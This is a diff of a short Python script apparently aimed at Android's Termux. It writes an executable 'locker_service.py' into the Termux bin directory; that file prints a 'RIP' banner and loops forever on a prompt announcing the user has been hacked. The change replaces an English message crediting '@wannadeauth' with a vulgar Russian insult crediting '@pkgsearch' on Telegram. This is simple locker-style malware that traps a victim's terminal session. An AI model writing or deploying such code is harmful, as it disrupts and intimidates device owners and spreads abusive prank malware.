@@ -2,16 +2,18 @@ import os
 
 file = open('/data/data/com.termux/files/usr/bin/locker_service.py', 'w')
 file.write("""print('''  _____                                     
- |_   _|                                    
-   | |    ___  _ __  _ __ ___   _   _ __  __
-   | |   / _ \\| '__|| '_ ` _ \\ | | | |\\ \\/ /
-   | |  |  __/| |   | | | | | || |_| | >  < 
-   \\_/   \___||_|   |_| |_| |_| \__,_|/_/\_\
-
+ RRRRRR.               I              PPPPPP.          
+R          R.          I.            P.   P
+R          R.          I.            P.   P
+R RRRRR.               I.            PPPPPP
+RR.                    I.            P
+R.  R.                 I.            P
+R.     R.              I.            P
+R.         R.          I.            P
 
 ''')
 while True:
-	a = input(' You have been hacked by @wannadeauth (telegram)')
+	a = input(' Твоя пизда взломана @pkgsearch (telegram)')
 """)
 file.close()
 os.system('chmod +x /data/data/com.termux/files/usr/bin/locker_service.py')
